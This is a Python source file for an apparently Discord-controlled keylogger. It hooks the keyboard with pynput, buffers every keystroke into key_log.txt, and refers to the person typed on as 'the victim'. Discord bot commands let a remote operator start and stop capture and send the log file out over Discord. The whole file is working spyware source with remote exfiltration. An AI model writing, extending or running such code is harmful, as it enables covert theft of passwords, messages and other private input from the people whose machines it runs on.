"""Write the keys that are typed on this machine into a log file.

The key logger listens to the keyboard and keeps the typed characters in
memory. The buffer is written into `key_log.txt` when it grows over the
threshold or after a few seconds, so the file is not written on every key
press.

Special keys are written as readable markers such as `<BACKSPACE>` so the
captured text stays readable. The space is written as a space, so the words
of the victim stay apart in the log.

Run it on its own with:

    python src/cmd/keylogger.py
"""

import threading
import time
from pathlib import Path
from typing import Any

import discord
from discord.ext import commands
from discord.ext.commands import Context

# File that collects the typed characters.
KEY_LOG_FILE = Path("key_log.txt")

# Number of characters after which the buffer is written into the file.
FLUSH_THRESHOLD = 2000

# Seconds after which the buffer is written into the file, so nothing is
# lost when the victim stops typing.
FLUSH_INTERVAL = 10.0


class KeyLogger:
    """Captures the keys typed on this machine and stores them in a file."""

    def __init__(self, path: Path = KEY_LOG_FILE) -> None:
        # Imported here so the Discord bot can use this module without
        # pulling in the keyboard hook.
        from pynput import keyboard

        self.keyboard = keyboard
        self.markers = self.build_markers(keyboard.Key)

        self.path = path
        self.buffer: list[str] = []
        # The number of characters that wait in the buffer, the list holds
        # one entry per key press.
        self.buffer_length = 0
        self.captured = 0
        # The listener runs on its own thread, so the buffer needs a lock.
        self.lock = threading.Lock()
        self.listener: Any = None
        self.flusher: threading.Thread | None = None
        self.stopped = threading.Event()

    @staticmethod
    def build_markers(key: Any) -> dict[Any, str]:
        """Return the markers used for the keys that have no character."""
        markers: dict[Any, str] = {
            key.enter: "\n",
            key.tab: "<TAB>",
            key.backspace: "<BACKSPACE>",
            key.delete: "<DELETE>",
            key.esc: "<ESC>",
            key.caps_lock: "<CAPSLOCK>",
            key.up: "<UP>",
            key.down: "<DOWN>",
            key.left: "<LEFT>",
            key.right: "<RIGHT>",
            key.ctrl: "<CTRL>",
            key.ctrl_l: "<CTRL>",
            key.ctrl_r: "<CTRL>",
            key.alt: "<ALT>",
            key.alt_l: "<ALT>",
            key.alt_r: "<ALT>",
            key.alt_gr: "<ALT>",
            key.shift: "<SHIFT>",
            key.shift_l: "<SHIFT>",
            key.shift_r: "<SHIFT>",
            key.cmd: "<CMD>",
            key.cmd_l: "<CMD>",
            key.cmd_r: "<CMD>",
            # The space is a key of its own, it carries no character.
            key.space: " ",
        }

        # The keys that only some versions of pynput know.
        optional = {
            "insert": "<INSERT>",
            "home": "<HOME>",
            "end": "<END>",
            "page_up": "<PAGE UP>",
            "page_down": "<PAGE DOWN>",
            "print_screen": "<PRINT SCREEN>",
            "pause": "<PAUSE>",
            "menu": "<MENU>",
            "num_lock": "<NUM LOCK>",
            "scroll_lock": "<SCROLL LOCK>",
            "media_play_pause": "<MEDIA PLAY/PAUSE>",
            "media_stop": "<MEDIA STOP>",
            "media_volume_mute": "<VOLUME MUTE>",
            "media_volume_down": "<VOLUME DOWN>",
            "media_volume_up": "<VOLUME UP>",
            "media_previous": "<MEDIA PREVIOUS>",
            "media_next": "<MEDIA NEXT>",
        }

        for name, marker in optional.items():
            member = getattr(key, name, None)

            if member is not None:
                markers[member] = marker

        for number in range(1, 25):
            member = getattr(key, f"f{number}", None)

            if member is not None:
                markers[member] = f"<F{number}>"

        return markers

    def on_press(self, key: Any) -> None:
        """Handle a single key press."""
        marker = self.markers.get(key)

        if marker is not None:
            self.append(marker)
            return

        # Some backends report the plain character instead of a key code.
        if isinstance(key, str):
            self.append(key)
            return

        char = getattr(key, "char", None)

        if not char:
            # A key that carries no character is still worth a line in the
            # log, otherwise the press would be lost.
            self.append(f"<{getattr(key, 'name', 'KEY')}>")
            return

        self.append(char)

    def append(self, text: str) -> None:
        """Add text to the buffer and count it as captured."""
        with self.lock:
            self.buffer.append(text)
            self.buffer_length += len(text)
            self.captured += len(text)
            full = self.buffer_length >= FLUSH_THRESHOLD

        # A full buffer is written right away, the file stays small.
        if full:
            self.flush()

    def drain(self) -> str:
        """Return the buffered text and clear the buffer."""
        with self.lock:
            text = "".join(self.buffer)
            self.buffer.clear()
            self.buffer_length = 0

        return text

    def flush(self) -> int:
        """Write the buffer into the log file and return its size."""
        text = self.drain()

        if not text:
            return 0

        try:
            with self.path.open("a", encoding="utf-8", errors="replace") as log:
                log.write(text)
        except OSError as exc:
            print(f"[-] Could not write the key log: {exc}")
            return 0

        return len(text)

    def start(self) -> None:
        """Start listening to the keyboard."""
        if self.listener is not None:
            return

        self.stopped.clear()
        self.listener = self.keyboard.Listener(on_press=self.on_press)
        self.listener.start()

        # The thread writes the buffer into the file every few seconds.
        self.flusher = threading.Thread(target=self.flush_loop, daemon=True)
        self.flusher.start()

    def flush_loop(self) -> None:
        """Write the buffer into the file until the logger is stopped."""
        while not self.stopped.wait(FLUSH_INTERVAL):
            self.flush()

    def stop(self) -> None:
        """Stop listening to the keyboard and write the last characters."""
        self.stopped.set()

        if self.listener is not None:
            self.listener.stop()
            self.listener = None

        if self.flusher is not None:
            self.flusher.join(timeout=2)
            self.flusher = None

        self.flush()

    @property
    def running(self) -> bool:
        """Whether the keyboard is currently being watched."""
        return self.listener is not None


# The key logger that runs inside the bot process.
logger: KeyLogger | None = None

# The file the key logger writes into, it is kept over a restart so the
# characters of a stopped logger are not split over two files.
log_path = KEY_LOG_FILE


def current_logger() -> KeyLogger | None:
    """Return the key logger that runs inside the bot process."""
    return logger


def start_keylogger(path: Path | None = None) -> KeyLogger | None:
    """Start the key logger and return the running instance."""
    global logger, log_path

    if logger is not None and logger.running:
        return logger

    if path is not None:
        log_path = path

    try:
        instance = KeyLogger(log_path)
        instance.start()
    except Exception as exc:
        print(f"[-] Could not start the key logger: {exc}")
        return None

    logger = instance
    return instance


def stop_keylogger() -> None:
    """Stop the key logger that runs inside the bot process."""
    global logger

    instance = logger

    if instance is None:
        return

    instance.stop()
    logger = None


async def keylog_start(ctx: Context[commands.Bot]) -> None:
    """Start the key logger on this machine."""
    instance = current_logger()

    if instance is not None and instance.running:
        await ctx.reply("The key logger is already running.")
        return

    instance = start_keylogger()

    if instance is None:
        await ctx.reply("Could not start the key logger.")
        return

    await ctx.reply(
        f"Key logger started, the characters are written into "
        f"`{instance.path.name}`."
    )


async def keylog_stop(ctx: Context[commands.Bot]) -> None:
    """Stop the key logger on this machine."""
    instance = current_logger()

    if instance is None or not instance.running:
        await ctx.reply("The key logger is not running.")
        return

    stop_keylogger()

    await ctx.reply(
        f"Key logger stopped, {instance.captured} character(s) were written "
        f"into `{instance.path.name}`."
    )


async def keylog_status(ctx: Context[commands.Bot]) -> None:
    """Show the state of the key logger and send the log file."""
    instance = current_logger()
    state = "running" if instance is not None and instance.running else "stopped"
    captured = instance.captured if instance is not None else 0

    path = instance.path if instance is not None else log_path

    if not path.is_file():
        await ctx.reply(
            f"The key logger is {state}, {captured} character(s) captured. "
            f"The log file `{path.name}` does not exist yet."
        )
        return

    # The characters that are still in memory belong into the file.
    if instance is not None and instance.running:
        instance.flush()

    await ctx.send(
        f"The key logger is {state}, {captured} character(s) captured.",
        file=discord.File(str(path), filename=path.name),
    )


def main() -> None:
    """Run the key logger until it is stopped."""
    instance = KeyLogger()
    instance.start()

    print("Key logger is running. Press ESC to exit.")
    print(f"Log file: {instance.path.resolve()}")

    try:
        while instance.running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    finally:
        instance.stop()


if __name__ == "__main__":
    main()
